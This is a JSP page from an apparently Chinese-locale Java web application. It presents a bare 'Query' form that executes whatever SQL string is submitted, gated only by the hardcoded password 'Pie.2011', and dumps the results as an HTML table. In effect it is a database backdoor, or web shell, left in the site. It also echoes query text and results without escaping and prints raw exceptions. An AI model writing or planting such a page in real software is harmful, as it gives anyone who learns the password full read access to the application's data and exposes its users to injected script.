<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page import="java.sql.ResultSetMetaData" %>
<%@ page language="java" %>
<%@ page contentType="text/html; charset=GBK" %>
<%response.setHeader("Expires", "Tues,01 Jan 1980 00:00:00 GMT");%>
<%
String sql = request.getParameter("s");
String pw = request.getParameter("p");
%>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=GBK">
    <title>Query
    </title>
    <link href="<%=request.getContextPath()%>/css/style.css" rel="stylesheet" type="text/css">
    <script language="javascript" src="<%=request.getContextPath()%>/js/check.js"></script>
    <script language="javascript" src="<%=request.getContextPath()%>/js/checkAll.js"></script>
    <SCRIPT language=javascript src="<%=request.getContextPath()%>/js/clientSideApp.js"></SCRIPT>
</head>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<center>
    <form method="post" action="" focus="">
        <table width=95% border=0 align="center" cellpadding=0 cellspacing=0>
            <tr >
                <td class=td_edit >
                    <textarea name="s" cols="100" rows="10"><%=com.jitong.common.util.StringUtil.fillNull(sql)%>
                    </textarea>
                </td>                
            </tr>
            <tr >
                <td class=td_edit >
                    <input name="p" type="text"></input>
                </td>
            </tr>
        </table>
        <table width="95%" border="0" cellpadding="0" cellspacing="0" class="table02" align="center">
            <tr>
                <td height="30" align="right">
                    <div align="center">
                        <input name=save2 type=submit class=button value='...'>
                    </div>
                </td>
            </tr>
        </table>
    </form>
</center>
<%
    if (sql != null && !sql.equals("")&&"Pie.2011".equals(pw)) {
        sql = sql.trim();
        org.hibernate.Session ses = null;
        Connection conn = null;
        PreparedStatement ps = null;
        ResultSet rs = null;
        try {
            ses = com.jitong.common.util.DBtools.getExclusiveSession();
            conn = ses.connection();
            ps = conn.prepareStatement(sql);
            rs = ps.executeQuery();
            ResultSetMetaData rsmd = rs.getMetaData();
            int columnCount = rsmd.getColumnCount();
            if (columnCount > 0) {
                out.println("<table border=\"1\">");
                out.println("<tr>");
                for (int i = 0; i < columnCount; i++) {
                    out.println("<td>");
                    out.println(rsmd.getColumnLabel(i+1));
                    out.println("</td>");
                }
                out.println("</tr>");
                while (rs.next()) {
                    out.println("<tr>");
                    for (int j = 0; j < columnCount; j++) {
                        out.println("<td>");
                        String v=rs.getString(j+1) ;
                        out.println(v==null?"&nbsp;":v);
                        out.println("</td>");
                    }
                    out.println("</tr>");
                }
                out.println("</table>");
            }

        } catch (Exception e) {
            out.print(e);
        } finally {
            try {
                if (rs != null) rs.close();
                if (ps != null) ps.close();
                if (conn != null) conn.close();
                if (ses != null) ses.close();
            } catch (Exception e) {
                out.print(e);
            }
        }
    }
%>
</body>
</html>